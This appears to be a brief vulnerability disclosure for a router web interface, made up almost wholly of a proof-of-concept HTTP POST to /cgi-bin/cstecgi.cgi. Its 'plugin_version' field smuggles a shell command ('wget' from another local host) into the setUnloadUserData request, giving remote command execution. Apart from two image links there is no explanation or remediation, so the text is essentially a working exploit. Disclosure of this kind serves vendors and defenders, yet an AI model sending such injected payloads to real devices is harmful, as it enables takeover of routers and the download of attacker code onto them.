## RCE-upgrade.so-setUnloadUserData-plugin_version

![image](https://github.com/user-attachments/assets/6b9416f3-f2dc-42f7-9a01-b0506bbc286b)

![image](https://github.com/user-attachments/assets/4bb5278b-cb59-467b-bf9b-6116a30c0f02)
## POC
```
POST /cgi-bin/cstecgi.cgi HTTP/1.1

Host: 192.168.0.254

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded; charset=UTF-8

X-Requested-With: XMLHttpRequest

Content-Length: 107

Origin: http://192.168.0.254

Connection: keep-alive

Referer: http://192.168.0.254/adm/network_daig.asp?timestamp=1673492576260



{"topicurl" :"setting/setUnloadUserData",

"plugin_version" : "a;wget http://192.168.0.253:8000/123.txt;a"}
```
